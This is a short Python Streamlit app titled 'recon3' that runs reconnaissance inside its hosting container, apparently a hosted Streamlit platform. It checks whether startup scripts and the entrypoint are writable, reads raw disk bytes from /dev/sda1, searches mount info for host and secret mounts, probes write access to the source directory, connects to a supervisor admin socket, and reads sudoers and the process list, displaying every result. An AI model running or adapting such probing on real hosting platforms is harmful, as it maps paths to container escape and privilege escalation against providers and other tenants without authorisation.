import streamlit as st, os, subprocess, socket
def sh(c,t=8):
    try: return subprocess.run(c,shell=True,capture_output=True,text=True,timeout=t).stdout[:3500]
    except Exception as e: return "ERR:"+repr(e)[:200]
R={}
R["app_scripts_perms"]=sh("ls -la /app/scripts/ 2>&1; echo ---; ls -la /app/ 2>&1 | head")
R["run_streamlit_sh"]=sh("cat /app/scripts/run-streamlit.sh 2>&1 | head -60")
R["scripts_writable"]=sh("for f in /app/scripts/run-streamlit.sh /app/scripts/streamlit-install.sh /app/scripts/pip-install.sh /entrypoint; do test -w \"$f\" && echo \"WRITABLE $f\" || echo \"ro $f\"; done")
R["dev_sda"]=sh("ls -la /dev/sda* /dev/sd* 2>&1; echo ---read-test---; head -c 32 /dev/sda1 2>&1 | xxd 2>/dev/null | head -2 || echo noread")
R["mountinfo"]=sh("cat /proc/1/mountinfo 2>/dev/null | grep -iE 'sda|mount|host|secret' | head -20 || cat /proc/self/mountinfo | grep -iE 'sda|/mount' | head")
R["src_dir_perms"]=sh("ls -la /mount/src/ ; echo ---; ls -la /mount/src/st-probe/ | head")
R["can_write_src"]=sh("touch /mount/src/st-probe/.bb 2>&1 && echo WRITABLE_SRC && rm -f /mount/src/st-probe/.bb")
# supervisor socket connect attempt (as appuser - expect denied)
def sock(p):
    try:
        s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(3); s.connect(p)
        s.send(b"GET /RPC2 HTTP/1.0\r\n\r\n"); d=s.recv(200); s.close(); return repr(d[:150])
    except Exception as e: return type(e).__name__+":"+str(e)[:80]
R["supervisor_sock"]=sock("/mount/admin/.supervisor.sock")
R["adminuser_sudo_files"]=sh("ls -la /etc/sudoers.d/ 2>&1; echo ---; cat /etc/sudoers 2>&1 | grep -vE '^#|^$' | head; sudo -n true 2>&1")
R["proc_other_pids"]=sh("ps aux 2>/dev/null | head -25 || ls /proc | grep -E '^[0-9]+$' | head")
R["home_appuser"]=sh("ls -la /home/appuser/ 2>&1 | head")
st.title("recon3"); st.json(R)
import sys
for k,v in R.items(): sys.stderr.write("R3>>> %s=%s\n"%(k,str(v)[:1500]))
